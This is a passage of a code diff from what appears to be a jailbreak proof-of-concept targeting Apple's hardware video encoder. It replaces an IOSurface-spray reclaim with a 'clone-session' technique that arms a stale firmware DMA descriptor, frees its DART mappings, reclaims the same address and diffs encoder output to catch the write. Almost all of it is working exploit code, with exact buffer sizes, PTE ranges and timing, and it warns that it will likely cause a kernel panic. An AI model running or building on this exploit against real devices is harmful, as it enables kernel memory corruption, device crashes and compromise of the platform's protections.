@@ -4078,45 +4078,52 @@ static void runDPrep2(void) {
 }
 
 // ============================================================
-// EXPERIMENT 3.0: Mode A — Clone-Session DART Re-claim
+// EXPERIMENT 3.0: Mode A — Clone-Session Bitstream-Diff
 //
 // The gating question is resolved: AXI_ID 0xc0 writes to an
-// INTERNAL driver-owned coded-output buffer, not an external
-// IOSurface. So D-prep can't catch the write directly.
+// INTERNAL driver-owned coded-output buffer. App-side IOSurfaces
+// never enter the AVE DART aperture — only the kext maps surfaces
+// into the encoder's DART pool via DARTMapInternalSurfaces during
+// session CONFIGURE. A bare IOSurface spray stays in the generic
+// allocator and can never re-claim the freed encoder PTE slots.
 //
-// Mode A exploits this:
-// 1. ARM: Create session, AlphaLayerID=255, encode → -17691
-//    Firmware DMA descriptor now armed targeting coded-output DVA
-// 2. FREE: Tear down session → DART PTEs freed, DMA stays armed
-// 3. SPRAY: Allocate IOSurfaces at exact coded-output size class
-//    (131,072 B = align_up(320*240*1.5, 16384)) to re-claim the
-//    freed DART PTE slots. Fill with canary pattern.
-// 4. WAIT: Poll sprayed surfaces for firmware write (200s window)
-// 5. READ: Detect canary corruption → write landed in our surface
+// The re-claim IS the clone: an identity-clone session drives
+// the same internal surface allocation through the same bump
+// allocator. Cross-boot PTE determinism (PTEs 0x1c4-0x20b across
+// 8 panics) means identical parameters land the coded buffer on
+// the recycled DVA — no spray, no size matching needed.
 //
-// Size derivation (from aquarat/apple-m-series-ave-driver docs/18):
-//   coded_size = align_up(align_up(W,16) * H * 3/2, 4096)
-//   At 320x240: align_up(320,16)=320, 320*240*1.5=115200
-//   align_up(115200, 4096) = 118784
-//   DART surface alloc: align_up(118784, 16384) = 131072 = 8 PTEs
-//   Header: constant 0xC000 = 49152 B → align_up = 49152 (3 PTEs)
-//   Total: 11 PTEs per coded buffer. Pool has up to 30 buffers.
+// Detection: we can't read the clone's internal coded buffer
+// directly. Instead we diff the clone's CMSampleBuffer bitstream
+// output against a clean-clone baseline. Anomalous bytes at fixed
+// offsets = the stale DMA write corrupted the coded buffer before
+// the ISR memcpy (dva+0x1270, length 0x9400) copied it out.
 //
-// The cross-boot PTE determinism (PTEs 0x1c4-0x20b across 8 panics)
-// means targeted allocation works — no spray randomness.
+// PREREQUISITE: Run D-prep-2 and C2 first!
+//   - D-prep-2 (keep-alive): tests if the write lands while PTEs
+//     are still valid (model b). If yes, Mode A is unnecessary —
+//     the primitive is "arm, keep alive, read output."
+//   - C2 (kill→fire latency): measures the re-claim window.
+//     If fire ≈ instantaneous with teardown (F≈U), no time to
+//     clone before panic. Mode A needs the keep-alive variant.
+//
+// Phases:
+// 1. BASELINE: Clean session, encode N frames, collect checksums
+// 2. ARM: AlphaLayerID=255, encode → -17691, DMA armed
+// 3. FREE: Tear down armed session → DART PTEs freed
+// 4. CLONE: Fresh session with identical config (Alpha=0), encode
+//    frames — its CONFIGURE re-claims the coded-output DVA slot
+// 5. DIFF: Compare clone output bitstreams against baseline
 // ============================================================
 
-// Coded-output size at 320x240 (from aquarat docs/18 formula)
-#define CODED_BUF_SIZE    131072   // align_up(align_up(320,16)*240*3/2, 16384)
-#define CODED_HDR_SIZE     49152   // constant 0xC000
-#define SPRAY_COUNT          128   // sprayed IOSurfaces for re-claim
-#define CANARY_WORD   0xDEADBEEF   // canary pattern to detect writes
-#define RECLAIM_POLL_SECS    200   // wait for firmware DMA fire
+#define EXP3_BASELINE_FRAMES   5
+#define EXP3_CLONE_FRAMES     30
+#define EXP3_POLL_SECS       200
 
 static volatile BOOL g_exp3Armed = NO;
 static volatile int g_exp3EncodeStatus = 0;
 
-static void exp3OutputCallback(
+static void exp3ArmCallback(
     void *ctx, void *sourceFrameRefCon, OSStatus status,
     VTEncodeInfoFlags infoFlags, CMSampleBufferRef sampleBuffer) {
     g_exp3EncodeStatus = (int)status;
@@ -4124,400 +4131,510 @@ static void exp3OutputCallback(
         PASS(@"[Exp3] Got -17691 — firmware DMA is armed!");
         g_exp3Armed = YES;
     } else if (status != noErr) {
-        INFO(@"[Exp3] Encode callback: %d (not -17691)", (int)status);
+        INFO(@"[Exp3] Arm encode callback: %d", (int)status);
     } else {
-        INFO(@"[Exp3] Encode succeeded (unexpected for AlphaLayerID=255)");
+        INFO(@"[Exp3] Arm encode succeeded (unexpected for Alpha=255)");
     }
 }
 
-static void runExp3_ModeA(void) {
-    pocLog(@"");
-    pocLog(@"╔══════════════════════════════════════════╗");
-    pocLog(@"║  EXPERIMENT 3.0: Mode A DART Re-claim    ║");
-    pocLog(@"║  Target: INTERNAL coded-output buffer     ║");
-    pocLog(@"║  *** WILL CAUSE KERNEL PANIC ***          ║");
-    pocLog(@"╚══════════════════════════════════════════╝");
-    pocLog(@"");
+// Baseline/clone output collection
+#define EXP3_MAX_SAMPLES 64
+static CMSampleBufferRef g_exp3Samples[EXP3_MAX_SAMPLES];
+static volatile int g_exp3SampleCount = 0;
+static volatile int g_exp3SampleErrors = 0;
 
-    os_log_t eLog = os_log_create("com.research.jbpoc", "exp3");
+static void exp3CollectCallback(
+    void *ctx, void *sourceFrameRefCon, OSStatus status,
+    VTEncodeInfoFlags infoFlags, CMSampleBufferRef sampleBuffer) {
+    if (status != noErr) {
+        g_exp3SampleErrors++;
+        INFO(@"[Exp3] Collect callback error: %d", (int)status);
+        return;
+    }
+    if (sampleBuffer && g_exp3SampleCount < EXP3_MAX_SAMPLES) {
+        CFRetain(sampleBuffer);
+        g_exp3Samples[g_exp3SampleCount] = sampleBuffer;
+        g_exp3SampleCount++;
+    }
+}
 
-    // ---- PHASE 1: ARM ----
-    LOG(@"═══ PHASE 1: ARM (AlphaLayerID=255) ═══");
+static NSData *exp3GetBitstreamData(CMSampleBufferRef sbuf) {
+    if (!sbuf) return nil;
+    CMBlockBufferRef block = CMSampleBufferGetDataBuffer(sbuf);
+    if (!block) return nil;
+    size_t len = CMBlockBufferGetDataLength(block);
+    if (len == 0) return nil;
+    NSMutableData *data = [NSMutableData dataWithLength:len];
+    CMBlockBufferCopyDataBytes(block, 0, len, data.mutableBytes);
+    return data;
+}
 
-    VTCompressionSessionRef session = NULL;
+static void exp3FreeSamples(void) {
+    for (int i = 0; i < g_exp3SampleCount; i++) {
+        if (g_exp3Samples[i]) {
+            CFRelease(g_exp3Samples[i]);
+            g_exp3Samples[i] = NULL;
+        }
+    }
+    g_exp3SampleCount = 0;
+    g_exp3SampleErrors = 0;
+}
+
+static VTCompressionSessionRef exp3CreateSession(
+    void *callback, BOOL setAlpha255) {
     NSDictionary *spec = @{
         (NSString *)kVTVideoEncoderSpecification_EnableHardwareAcceleratedVideoEncoder: @YES,
         (NSString *)kVTVideoEncoderSpecification_RequireHardwareAcceleratedVideoEncoder: @YES,
     };
 
+    VTCompressionSessionRef session = NULL;
     OSStatus status = VTCompressionSessionCreate(
         kCFAllocatorDefault, 320, 240, kCMVideoCodecType_HEVC,
         (__bridge CFDictionaryRef)spec, NULL, kCFAllocatorDefault,
-        exp3OutputCallback, NULL, &session);
+        (VTCompressionOutputCallback)callback, NULL, &session);
 
     if (status != noErr) {
         FAIL(@"Session creation failed: %d", (int)status);
-        return;
+        return NULL;
     }
-    PASS(@"HEVC 320x240 session created");
 
-    // Set AlphaLayerID=255 — the SOLE DART panic trigger
-    VTSessionSetProperty(session,
-        CFSTR("RequiredHEVCVideoParameterSetAlphaLayerID"),
-        (__bridge CFTypeRef)@(255));
-    INFO(@"Set AlphaLayerID=255");
+    if (setAlpha255) {
+        VTSessionSetProperty(session,
+            CFSTR("RequiredHEVCVideoParameterSetAlphaLayerID"),
+            (__bridge CFTypeRef)@(255));
+    }
 
     status = VTCompressionSessionPrepareToEncodeFrames(session);
     if (status != noErr) {
         FAIL(@"PrepareToEncode failed: %d", (int)status);
         VTCompressionSessionInvalidate(session);
         CFRelease(session);
-        return;
+        return NULL;
     }
-    PASS(@"PrepareToEncode OK — session configured, DART surfaces mapped");
 
-    // Create pixel buffer
+    return session;
+}
+
+static CVPixelBufferRef exp3CreatePixelBuffer(uint8_t yFill, uint8_t uvFill) {
     CVPixelBufferRef pb = NULL;
-    status = CVPixelBufferCreate(kCFAllocatorDefault, 320, 240,
+    OSStatus status = CVPixelBufferCreate(kCFAllocatorDefault, 320, 240,
         kCVPixelFormatType_420YpCbCr8BiPlanarFullRange,
         (__bridge CFDictionaryRef)@{
             (NSString *)kCVPixelBufferIOSurfacePropertiesKey: @{}
         }, &pb);
+    if (status != noErr || !pb) return NULL;
 
-    if (status != noErr || !pb) {
-        FAIL(@"Pixel buffer failed: %d", (int)status);
-        VTCompressionSessionInvalidate(session);
-        CFRelease(session);
-        return;
-    }
-
-    // Fill with known pattern
     CVPixelBufferLockBaseAddress(pb, 0);
-    void *yPlane = CVPixelBufferGetBaseAddressOfPlane(pb, 0);
-    if (yPlane) memset(yPlane, 0x80,
+    void *y = CVPixelBufferGetBaseAddressOfPlane(pb, 0);
+    if (y) memset(y, yFill,
         CVPixelBufferGetBytesPerRowOfPlane(pb, 0) *
         CVPixelBufferGetHeightOfPlane(pb, 0));
-    void *uvPlane = CVPixelBufferGetBaseAddressOfPlane(pb, 1);
-    if (uvPlane) memset(uvPlane, 0x80,
+    void *uv = CVPixelBufferGetBaseAddressOfPlane(pb, 1);
+    if (uv) memset(uv, uvFill,
         CVPixelBufferGetBytesPerRowOfPlane(pb, 1) *
         CVPixelBufferGetHeightOfPlane(pb, 1));
     CVPixelBufferUnlockBaseAddress(pb, 0);
+    return pb;
+}
 
-    // Encode — this arms the firmware DMA descriptor
-    g_exp3Armed = NO;
-    CMTime pts = CMTimeMake(0, 30);
-    status = VTCompressionSessionEncodeFrame(session, pb, pts,
-        kCMTimeInvalid, NULL, NULL, NULL);
-    INFO(@"EncodeFrame submitted: %d", (int)status);
+static void runExp3_ModeA(void) {
+    pocLog(@"");
+    pocLog(@"╔═══════════════════════════════════════════╗");
+    pocLog(@"║  EXPERIMENT 3.0: Mode A Clone-Session     ║");
+    pocLog(@"║  Bitstream-Diff DART Re-claim             ║");
+    pocLog(@"║  *** WILL LIKELY CAUSE KERNEL PANIC ***   ║");
+    pocLog(@"╚═══════════════════════════════════════════╝");
+    pocLog(@"");
 
-    // Wait for callback
-    VTCompressionSessionCompleteEncoding(session);
-    [NSThread sleepForTimeInterval:2.0];
+    INFO(@"PREREQUISITE: Run D-prep-2 and C2 first!");
+    INFO(@"D-prep-2 tests if write lands while PTEs are valid (model b).");
+    INFO(@"C2 measures the re-claim window (kill→fire latency).");
+    INFO(@"If D-prep-2 hits, Mode A is unnecessary.");
+    INFO(@"If C2 shows fire≈kill, Mode A can't sequence in time.");
+    pocLog(@"");
 
-    if (!g_exp3Armed) {
-        FAIL(@"Did not get -17691. Callback status: %d", g_exp3EncodeStatus);
-        INFO(@"AlphaLayerID=255 may not trigger on this firmware version.");
-        VTCompressionSessionInvalidate(session);
-        CFRelease(session);
-        CVPixelBufferRelease(pb);
+    os_log_t eLog = os_log_create("com.research.jbpoc", "exp3");
+
+    // ---- PHASE 1: BASELINE ----
+    LOG(@"═══ PHASE 1: BASELINE (clean session output) ═══");
+    LOG(@"Collecting %d clean encode outputs as reference...", EXP3_BASELINE_FRAMES);
+
+    exp3FreeSamples();
+    VTCompressionSessionRef baseSession = exp3CreateSession(
+        (void *)exp3CollectCallback, NO);
+    if (!baseSession) {
+        FAIL(@"Could not create baseline session");
+        return;
+    }
+    PASS(@"Baseline HEVC 320x240 session created");
+
+    CVPixelBufferRef basePB = exp3CreatePixelBuffer(0x80, 0x80);
+    if (!basePB) {
+        FAIL(@"Baseline pixel buffer failed");
+        VTCompressionSessionInvalidate(baseSession);
+        CFRelease(baseSession);
         return;
     }
 
-    os_log(eLog, "JBPoC-EXP3 PHASE1 armed=YES status=%d", g_exp3EncodeStatus);
+    for (int i = 0; i < EXP3_BASELINE_FRAMES; i++) {
+        CMTime pts = CMTimeMake(i, 30);
+        VTCompressionSessionEncodeFrame(baseSession, basePB, pts,
+            kCMTimeInvalid, NULL, NULL, NULL);
+    }
+    VTCompressionSessionCompleteEncoding(baseSession);
+    [NSThread sleepForTimeInterval:1.0];
 
-    // ---- PHASE 2: FREE (Teardown) ----
+    int baselineCount = g_exp3SampleCount;
+    PASS(@"Baseline collected: %d samples, %d errors",
+         baselineCount, g_exp3SampleErrors);
+
+    // Store baseline bitstream checksums and data
+    NSMutableArray *baselineData = [NSMutableArray array];
+    NSMutableArray *baselineSizes = [NSMutableArray array];
+    for (int i = 0; i < baselineCount; i++) {
+        NSData *bs = exp3GetBitstreamData(g_exp3Samples[i]);
+        if (bs) {
+            [baselineData addObject:bs];
+            [baselineSizes addObject:@(bs.length)];
+            LOG(@"  Baseline[%d]: %zu bytes", i, bs.length);
+        } else {
+            [baselineData addObject:[NSData data]];
+            [baselineSizes addObject:@(0)];
+            INFO(@"  Baseline[%d]: no bitstream data", i);
+        }
+    }
+
+    // Tear down baseline session
+    VTCompressionSessionInvalidate(baseSession);
+    CFRelease(baseSession);
+    CVPixelBufferRelease(basePB);
+    exp3FreeSamples();
+
+    if (baselineData.count == 0) {
+        FAIL(@"No baseline data collected — cannot diff");
+        return;
+    }
+
+    os_log(eLog, "JBPoC-EXP3 PHASE1 baseline=%d frames", baselineCount);
+
+    // Brief pause between sessions
+    [NSThread sleepForTimeInterval:2.0];
+
+    // ---- PHASE 2: ARM ----
     LOG(@"");
-    LOG(@"═══ PHASE 2: FREE (Session teardown) ═══");
-    LOG(@"Invalidating session — DART PTEs will be freed");
-    LOG(@"but firmware DMA descriptor stays armed with stale DVA.");
+    LOG(@"═══ PHASE 2: ARM (AlphaLayerID=255) ═══");
+
+    g_exp3Armed = NO;
+    g_exp3EncodeStatus = 0;
+    VTCompressionSessionRef armSession = exp3CreateSession(
+        (void *)exp3ArmCallback, YES);
+    if (!armSession) {
+        FAIL(@"Could not create armed session");
+        return;
+    }
+    PASS(@"Armed HEVC 320x240 session created (AlphaLayerID=255)");
+
+    CVPixelBufferRef armPB = exp3CreatePixelBuffer(0x80, 0x80);
+    if (!armPB) {
+        FAIL(@"Armed pixel buffer failed");
+        VTCompressionSessionInvalidate(armSession);
+        CFRelease(armSession);
+        return;
+    }
+
+    CMTime armPTS = CMTimeMake(0, 30);
+    OSStatus encStatus = VTCompressionSessionEncodeFrame(armSession, armPB,
+        armPTS, kCMTimeInvalid, NULL, NULL, NULL);
+    INFO(@"Armed EncodeFrame submitted: %d", (int)encStatus);
+
+    VTCompressionSessionCompleteEncoding(armSession);
+    [NSThread sleepForTimeInterval:2.0];
+
+    if (!g_exp3Armed) {
+        FAIL(@"Did not get -17691. Status: %d", g_exp3EncodeStatus);
+        INFO(@"AlphaLayerID=255 may not trigger on this firmware version.");
+        VTCompressionSessionInvalidate(armSession);
+        CFRelease(armSession);
+        CVPixelBufferRelease(armPB);
+        return;
+    }
+
+    os_log(eLog, "JBPoC-EXP3 PHASE2 armed=YES");
+
+    // ---- PHASE 3: FREE ----
+    LOG(@"");
+    LOG(@"═══ PHASE 3: FREE (Session teardown) ═══");
+    LOG(@"Invalidating armed session — DART PTEs freed,");
+    LOG(@"firmware DMA descriptor stays armed with stale DVA.");
+    LOG(@"*** IF FIRE ≈ UNMAP, device panics here. ***");
+    LOG(@"*** That's the F≈U sequencing risk — run C2 first! ***");
 
     NSDate *freeTime = [NSDate date];
-    VTCompressionSessionInvalidate(session);
-    CFRelease(session);
-    session = NULL;
-    CVPixelBufferRelease(pb);
-    pb = NULL;
+    VTCompressionSessionInvalidate(armSession);
+    CFRelease(armSession);
+    armSession = NULL;
+    CVPixelBufferRelease(armPB);
+    armPB = NULL;
 
-    // Brief pause for teardown to complete
     [NSThread sleepForTimeInterval:0.5];
-    PASS(@"Session torn down. DART PTEs freed. DMA descriptor is stale.");
-    os_log(eLog, "JBPoC-EXP3 PHASE2 session_freed");
+    PASS(@"Armed session torn down. Stale DVA is live.");
+    LOG(@"Survived 0.5s post-teardown — F≈U not immediate.");
+    os_log(eLog, "JBPoC-EXP3 PHASE3 freed survived_500ms");
 
-    // ---- PHASE 3: SPRAY (IOSurface re-claim) ----
+    // ---- PHASE 4: CLONE ----
     LOG(@"");
-    LOG(@"═══ PHASE 3: SPRAY (IOSurface re-claim) ═══");
-    LOG(@"Spraying %d IOSurfaces at %d bytes each (coded-output size class)",
-        SPRAY_COUNT, CODED_BUF_SIZE);
-    LOG(@"Target: re-claim the freed DART PTE slots at PTEs 0x1c4-0x20b");
+    LOG(@"═══ PHASE 4: CLONE (Identity re-claim) ═══");
+    LOG(@"Creating clone session with identical config (Alpha=0).");
+    LOG(@"Its CONFIGURE drives DARTMapInternalSurfaces through the");
+    LOG(@"same bump allocator → coded-output lands on recycled DVA.");
 
-    IOSurfaceRef spraySurfs[SPRAY_COUNT];
-    uint8_t *spraySnaps[SPRAY_COUNT];
-    int sprayOK = 0;
+    exp3FreeSamples();
+    VTCompressionSessionRef cloneSession = exp3CreateSession(
+        (void *)exp3CollectCallback, NO);
+    if (!cloneSession) {
+        FAIL(@"Clone session creation failed");
+        INFO(@"If device panics shortly, F≈U confirmed — stale descriptor");
+        INFO(@"fired before clone could map. Need keep-alive variant.");
+        return;
+    }
+    PASS(@"Clone session created — internal surfaces re-mapped");
+    LOG(@"If the bump allocator recycled the armed DVA, the clone's");
+    LOG(@"coded-output buffer now sits at the stale descriptor's target.");
 
-    for (int i = 0; i < SPRAY_COUNT; i++) {
-        NSDictionary *surfProps = @{
-            @"IOSurfaceWidth": @(320),
-            @"IOSurfaceHeight": @(240),
-            @"IOSurfaceBytesPerRow": @(CODED_BUF_SIZE / 240),
-            @"IOSurfaceBytesPerElement": @(1),
-            @"IOSurfaceAllocSize": @(CODED_BUF_SIZE),
-            @"IOSurfacePixelFormat": @(0x20202020),  // ' ' = raw bytes
-        };
-        IOSurfaceRef surf = IOSurfaceCreate((__bridge CFDictionaryRef)surfProps);
-        if (!surf) {
-            INFO(@"IOSurface %d creation failed", i);
-            spraySurfs[i] = NULL;
-            spraySnaps[i] = NULL;
-            continue;
-        }
-        spraySurfs[i] = surf;
-
-        // Fill with canary pattern
-        IOSurfaceLock(surf, 0, NULL);
-        uint32_t *base = (uint32_t *)IOSurfaceGetBaseAddress(surf);
-        size_t allocSize = IOSurfaceGetAllocSize(surf);
-        if (base) {
-            for (size_t j = 0; j < allocSize / 4; j++) {
-                base[j] = CANARY_WORD;
-            }
-        }
-        IOSurfaceUnlock(surf, 0, NULL);
-
-        // Take snapshot
-        spraySnaps[i] = malloc(allocSize);
-        if (spraySnaps[i]) {
-            IOSurfaceLock(surf, kIOSurfaceLockReadOnly, NULL);
-            memcpy(spraySnaps[i], IOSurfaceGetBaseAddress(surf), allocSize);
-            IOSurfaceUnlock(surf, kIOSurfaceLockReadOnly, NULL);
-        }
-
-        sprayOK++;
+    CVPixelBufferRef clonePB = exp3CreatePixelBuffer(0x80, 0x80);
+    if (!clonePB) {
+        FAIL(@"Clone pixel buffer failed");
+        VTCompressionSessionInvalidate(cloneSession);
+        CFRelease(cloneSession);
+        return;
     }
 
-    PASS(@"Sprayed %d/%d IOSurfaces (%d bytes each, total %.1f MB)",
-         sprayOK, SPRAY_COUNT, CODED_BUF_SIZE,
-         (double)sprayOK * CODED_BUF_SIZE / (1024.0 * 1024.0));
+    os_log(eLog, "JBPoC-EXP3 PHASE4 clone_created");
 
-    // Also spray at header size class
-    #define HDR_SPRAY_COUNT 32
-    IOSurfaceRef hdrSurfs[HDR_SPRAY_COUNT];
-    uint8_t *hdrSnaps[HDR_SPRAY_COUNT];
-    int hdrOK = 0;
+    // Encode frames through clone and collect output
+    LOG(@"Encoding %d frames through clone session...", EXP3_CLONE_FRAMES);
 
-    for (int i = 0; i < HDR_SPRAY_COUNT; i++) {
-        NSDictionary *hdrProps = @{
-            @"IOSurfaceWidth": @(256),
-            @"IOSurfaceHeight": @(192),
-            @"IOSurfaceBytesPerRow": @(CODED_HDR_SIZE / 192),
-            @"IOSurfaceBytesPerElement": @(1),
-            @"IOSurfaceAllocSize": @(CODED_HDR_SIZE),
-            @"IOSurfacePixelFormat": @(0x20202020),
-        };
-        IOSurfaceRef surf = IOSurfaceCreate((__bridge CFDictionaryRef)hdrProps);
-        if (!surf) {
-            hdrSurfs[i] = NULL;
-            hdrSnaps[i] = NULL;
-            continue;
+    for (int i = 0; i < EXP3_CLONE_FRAMES; i++) {
+        CMTime pts = CMTimeMake(i, 30);
+        VTCompressionSessionEncodeFrame(cloneSession, clonePB, pts,
+            kCMTimeInvalid, NULL, NULL, NULL);
+
+        // Flush periodically so we get outputs during the wait window
+        if ((i + 1) % 5 == 0) {
+            VTCompressionSessionCompleteEncoding(cloneSession);
+            [NSThread sleepForTimeInterval:0.1];
         }
-        hdrSurfs[i] = surf;
-
-        IOSurfaceLock(surf, 0, NULL);
-        uint32_t *base = (uint32_t *)IOSurfaceGetBaseAddress(surf);
-        size_t allocSize = IOSurfaceGetAllocSize(surf);
-        if (base) {
-            for (size_t j = 0; j < allocSize / 4; j++) {
-                base[j] = CANARY_WORD;
-            }
-        }
-        IOSurfaceUnlock(surf, 0, NULL);
-
-        hdrSnaps[i] = malloc(allocSize);
-        if (hdrSnaps[i]) {
-            IOSurfaceLock(surf, kIOSurfaceLockReadOnly, NULL);
-            memcpy(hdrSnaps[i], IOSurfaceGetBaseAddress(surf), allocSize);
-            IOSurfaceUnlock(surf, kIOSurfaceLockReadOnly, NULL);
-        }
-        hdrOK++;
     }
+    VTCompressionSessionCompleteEncoding(cloneSession);
+    [NSThread sleepForTimeInterval:1.0];
 
-    LOG(@"Also sprayed %d header-sized IOSurfaces (%d bytes each)", hdrOK, CODED_HDR_SIZE);
-    os_log(eLog, "JBPoC-EXP3 PHASE3 spray=%d/%d hdr=%d/%d",
-           sprayOK, SPRAY_COUNT, hdrOK, HDR_SPRAY_COUNT);
+    int cloneCount = g_exp3SampleCount;
+    PASS(@"Clone collected: %d samples, %d errors",
+         cloneCount, g_exp3SampleErrors);
+    os_log(eLog, "JBPoC-EXP3 PHASE4 clone_samples=%d errors=%d",
+           cloneCount, g_exp3SampleErrors);
 
-    // ---- PHASE 4: POLL (Watch for firmware write) ----
+    // ---- Now wait for the stale descriptor to fire ----
     LOG(@"");
-    LOG(@"═══ PHASE 4: POLL (Watching for DMA write) ═══");
-    LOG(@"Monitoring %d+%d IOSurfaces for %ds...", sprayOK, hdrOK, RECLAIM_POLL_SECS);
-    LOG(@"Firmware idle timer fires stale descriptor at ~90-160s post-arm.");
-    LOG(@"If we re-claimed the right PTE, the write lands in our canary.");
+    LOG(@"Waiting for stale DMA fire while clone session holds PTEs...");
+    LOG(@"Continuing to encode through clone every 10s to produce");
+    LOG(@"bitstreams that may carry corruption from the stale write.");
 
-    int hitCount = 0;
-    int firstHitTime = -1;
-    int firstHitSurf = -1;
-    NSDate *pollStart = [NSDate date];
+    int elapsed0 = (int)[[NSDate date] timeIntervalSinceDate:freeTime];
+    int remainWait = EXP3_POLL_SECS - elapsed0;
+    if (remainWait < 30) remainWait = 30;
 
-    for (int sec = 0; sec < RECLAIM_POLL_SECS; sec++) {
-        [NSThread sleepForTimeInterval:1.0];
+    for (int sec = 0; sec < remainWait; sec += 10) {
+        [NSThread sleepForTimeInterval:10.0];
         int elapsed = (int)[[NSDate date] timeIntervalSinceDate:freeTime];
 
-        // Check coded-output size spray
-        for (int i = 0; i < SPRAY_COUNT; i++) {
-            if (!spraySurfs[i] || !spraySnaps[i]) continue;
-            IOSurfaceLock(spraySurfs[i], kIOSurfaceLockReadOnly, NULL);
-            uint8_t *cur = (uint8_t *)IOSurfaceGetBaseAddress(spraySurfs[i]);
-            size_t sz = IOSurfaceGetAllocSize(spraySurfs[i]);
+        // Encode a batch through clone to sample the coded buffer state
+        for (int f = 0; f < 3; f++) {
+            CMTime pts = CMTimeMake(cloneCount + f, 30);
+            VTCompressionSessionEncodeFrame(cloneSession, clonePB, pts,
+                kCMTimeInvalid, NULL, NULL, NULL);
+        }
+        VTCompressionSessionCompleteEncoding(cloneSession);
+        [NSThread sleepForTimeInterval:0.5];
 
-            int diffs = 0;
-            int firstOff = -1;
-            uint8_t firstOld = 0, firstNew = 0;
+        int newCount = g_exp3SampleCount;
+        INFO(@"T+%03ds: %d total samples collected (clone alive)", elapsed, newCount);
+    }
 
-            if (cur) {
-                for (size_t j = 0; j < sz; j++) {
-                    if (cur[j] != spraySnaps[i][j]) {
-                        if (diffs == 0) {
-                            firstOff = (int)j;
-                            firstOld = spraySnaps[i][j];
-                            firstNew = cur[j];
-                        }
-                        diffs++;
-                    }
-                }
+    int finalCount = g_exp3SampleCount;
+    LOG(@"");
+    LOG(@"Total samples: %d (baseline: %d)", finalCount, baselineCount);
+
+    // ---- PHASE 5: DIFF ----
+    LOG(@"");
+    LOG(@"═══ PHASE 5: DIFF (Bitstream comparison) ═══");
+    LOG(@"Comparing clone outputs against baseline...");
+    LOG(@"Corruption signature: anomalous bytes, especially near");
+    LOG(@"DVA+0x1270 region (ISR memcpy copies 0x9400 bytes from there).");
+
+    int hitCount = 0;
+    int firstHitFrame = -1;
+    NSMutableString *hitReport = [NSMutableString string];
+
+    for (int i = 0; i < finalCount; i++) {
+        NSData *cloneBS = exp3GetBitstreamData(g_exp3Samples[i]);
+        if (!cloneBS || cloneBS.length == 0) continue;
+
+        // Compare against baseline frame (wrap around)
+        int baseIdx = i % baselineData.count;
+        NSData *baseBS = baselineData[baseIdx];
+
+        if (baseBS.length == 0) continue;
+
+        // Size difference is a signal
+        if (cloneBS.length != baseBS.length) {
+            hitCount++;
+            if (firstHitFrame < 0) firstHitFrame = i;
+            NSString *msg = [NSString stringWithFormat:
+                @"Frame %d: SIZE DIFF baseline=%zu clone=%zu",
+                i, baseBS.length, cloneBS.length];
+            PASS(@"*** HIT: %@ ***", msg);
+            [hitReport appendFormat:@"%@\n", msg];
+            os_log(eLog, "JBPoC-EXP3 DIFF-HIT frame=%d sizeDiff base=%zu clone=%zu",
+                   i, baseBS.length, cloneBS.length);
+            continue;
+        }
+
+        // Byte-level diff
+        const uint8_t *baseBytes = baseBS.bytes;
+        const uint8_t *cloneBytes = cloneBS.bytes;
+        size_t len = MIN(baseBS.length, cloneBS.length);
+
+        int diffs = 0;
+        int firstDiffOff = -1;
+
+        for (size_t j = 0; j < len; j++) {
+            if (baseBytes[j] != cloneBytes[j]) {
+                if (diffs == 0) firstDiffOff = (int)j;
+                diffs++;
             }
+        }
 
-            if (diffs > 0) {
+        if (diffs > 0) {
+            // Is this an expected difference (different encode, frame number, etc)?
+            // Frames with same index against same baseline should be very close.
+            // Large diff counts or diffs in unusual regions are the signal.
+            if (i < baselineCount) {
+                // Same frame index as baseline — should be near-identical
+                // (same input, same config, same encoder state)
                 hitCount++;
-                if (firstHitTime < 0) {
-                    firstHitTime = elapsed;
-                    firstHitSurf = i;
-                }
-                PASS(@"*** HIT: Coded spray[%d] at T+%ds ***", i, elapsed);
-                LOG(@"  %d bytes changed (of %zu), first at 0x%x (0x%02x→0x%02x)",
-                    diffs, sz, firstOff, firstOld, firstNew);
+                if (firstHitFrame < 0) firstHitFrame = i;
 
-                // Dump first 64 changed bytes
+                PASS(@"*** HIT: Frame %d: %d bytes differ (first at 0x%x) ***",
+                     i, diffs, firstDiffOff);
+
+                // Dump first 32 differences
                 NSMutableString *hex = [NSMutableString string];
                 int dumped = 0;
-                for (size_t j = (size_t)firstOff; j < sz && dumped < 64; j++) {
-                    if (cur[j] != spraySnaps[i][j]) {
-                        [hex appendFormat:@"%04zx:%02x→%02x ", j, spraySnaps[i][j], cur[j]];
+                for (size_t j = (size_t)firstDiffOff; j < len && dumped < 32; j++) {
+                    if (baseBytes[j] != cloneBytes[j]) {
+                        [hex appendFormat:@"%04zx:%02x→%02x ", j, baseBytes[j], cloneBytes[j]];
                         dumped++;
                     }
                 }
                 LOG(@"  Diff: %@", hex);
+                [hitReport appendFormat:@"Frame %d: %d diffs at 0x%x\n", i, diffs, firstDiffOff];
 
-                os_log(eLog, "JBPoC-EXP3 HIT spray[%d] T+%ds diffs=%d first=0x%x",
-                       i, elapsed, diffs, firstOff);
-
-                // Update snapshot
-                memcpy(spraySnaps[i], cur, sz);
+                os_log(eLog, "JBPoC-EXP3 DIFF-HIT frame=%d diffs=%d first=0x%x",
+                       i, diffs, firstDiffOff);
+            } else {
+                // Later frame — diff is expected (different frame number), just log
+                INFO(@"Frame %d: %d byte diffs vs baseline[%d] (expected for later frames)",
+                     i, diffs, baseIdx);
             }
-            IOSurfaceUnlock(spraySurfs[i], kIOSurfaceLockReadOnly, NULL);
-        }
-
-        // Check header-size spray
-        for (int i = 0; i < HDR_SPRAY_COUNT; i++) {
-            if (!hdrSurfs[i] || !hdrSnaps[i]) continue;
-            IOSurfaceLock(hdrSurfs[i], kIOSurfaceLockReadOnly, NULL);
-            uint8_t *cur = (uint8_t *)IOSurfaceGetBaseAddress(hdrSurfs[i]);
-            size_t sz = IOSurfaceGetAllocSize(hdrSurfs[i]);
-
-            int diffs = 0;
-            int firstOff = -1;
-
-            if (cur) {
-                for (size_t j = 0; j < sz; j++) {
-                    if (cur[j] != hdrSnaps[i][j]) {
-                        if (diffs == 0) firstOff = (int)j;
-                        diffs++;
-                    }
-                }
-            }
-
-            if (diffs > 0) {
-                hitCount++;
-                if (firstHitTime < 0) {
-                    firstHitTime = elapsed;
-                    firstHitSurf = 1000 + i;
-                }
-                PASS(@"*** HIT: Header spray[%d] at T+%ds ***", i, elapsed);
-                LOG(@"  %d bytes changed (of %zu), first at 0x%x", diffs, sz, firstOff);
-
-                NSMutableString *hex = [NSMutableString string];
-                int dumped = 0;
-                for (size_t j = (size_t)firstOff; j < sz && dumped < 32; j++) {
